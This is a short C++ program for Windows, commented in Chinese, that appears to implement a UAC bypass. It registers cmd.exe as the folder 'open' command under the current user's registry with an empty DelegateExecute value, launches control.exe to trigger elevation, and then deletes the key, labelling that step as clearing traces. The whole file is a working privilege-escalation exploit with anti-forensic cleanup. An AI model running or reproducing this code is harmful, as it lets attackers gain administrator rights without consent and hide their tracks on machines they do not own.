#include <Windows.h>
#include <tchar.h>
#include <iostream>

int main() {
    HKEY hKey; // 注册表句柄
    LPCWSTR subKey = L"Software\\Classes\\Folder\\shell\\open\\command"; // 子键路径
    LPCWSTR valueName = L"DelegateExecute"; // 键值名称
    LPCWSTR data = L""; // 键值数据（空字符串）

    // 打开或创建注册表项
    LONG result = RegCreateKeyEx(
        HKEY_CURRENT_USER,              // 根键：HKCU
        subKey,                         // 子键路径
        0,                              // 保留，必须为0
        NULL,                           // 类类型（通常为NULL）
        REG_OPTION_NON_VOLATILE,        // 注册表项属性（非易失性）
        KEY_WRITE,                      // 权限：写入
        NULL,                           // 安全属性
        &hKey,                          // 返回的注册表句柄
        NULL                            // 是否新建的标志（可为NULL）
    );

    // 写入键值
    result = RegSetValueEx(
        hKey,                       // 打开的注册表句柄
        valueName,                  // 键值名称
        0,                          // 保留，必须为0
        REG_SZ,                     // 数据类型（字符串）
        (const BYTE*)data,          // 数据
        (DWORD)((wcslen(data) + 1) * sizeof(wchar_t)) // 数据大小，包含终止符
    );
    if (result == ERROR_SUCCESS) {
        printf("command 写入成功\n");
    }

    LPCWSTR defaultValue = NULL; // 默认值的键名为 NULL
    LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe"; // 要设置的值，替换为你的 CMD

    LONG res = RegSetValueEx(
        hKey,
        defaultValue,
        0,                          // 保留，必须为0
        REG_SZ,                     // 数据类型（字符串）
        (const BYTE*)cmd,          // 数据
        (DWORD)((wcslen(cmd) + 1) * sizeof(wchar_t)) // 数据大小，包含终止符
    );
    if (res == ERROR_SUCCESS) {
        printf("cmd写入成功\n");
    }

    int re = system("C:\\Windows\\System32\\control.exe");

    if (re == 0) {
        // 执行成功
        printf("程序执行成功.\n");
    }

    LONG resu = RegDeleteKey(
        HKEY_CURRENT_USER,   // 根键：HKEY_CURRENT_USER
        subKey               // 要删除的子键路径
    );

    if (resu == ERROR_SUCCESS) {
        printf("清除痕迹");
    }

    return 0;
}
